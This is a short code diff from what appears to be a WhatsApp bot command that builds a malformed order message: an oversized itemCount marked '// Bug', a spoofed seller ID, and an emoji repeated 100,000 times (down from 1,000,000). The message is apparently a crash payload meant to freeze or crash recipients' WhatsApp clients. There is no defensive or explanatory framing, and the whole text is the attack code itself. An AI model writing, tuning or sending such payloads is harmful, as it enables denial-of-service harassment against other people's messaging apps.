@@ -11,7 +11,7 @@ let handler = async (m, { conn, text, args, usedPrefix, command }) => {
         itemCount: 999999999999999999999999999999999999, // Bug
         status: 1,
         surface: 1,
-        message: '🔥'.repeat(1000000),
+        message: '🔥'.repeat(100000),
         orderTitle: 'Dreaded', // Idk uuh peace
         sellerJid: '0@s.whatsapp.net' // Seller
        }
